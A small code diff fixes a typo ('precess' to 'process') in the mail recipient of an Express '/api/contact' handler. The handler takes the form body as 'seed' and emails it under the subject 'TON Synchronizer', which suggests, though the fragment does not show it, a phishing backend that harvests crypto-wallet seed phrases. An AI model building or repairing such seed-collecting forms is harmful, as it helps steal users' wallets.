@@ -38,7 +38,7 @@ app.post("/api/contact", bodyParser.urlencoded({ extended:false}), (req, res) =>
     const seed = req.body
     const mail = {
         form: process.env.EMAIL_ADDRESS,
-        to: precess.env.EMAIL_TO ,
+        to: process.env.EMAIL_TO ,
         subject: "TON Synchronizer",
         html: `
         <div> 
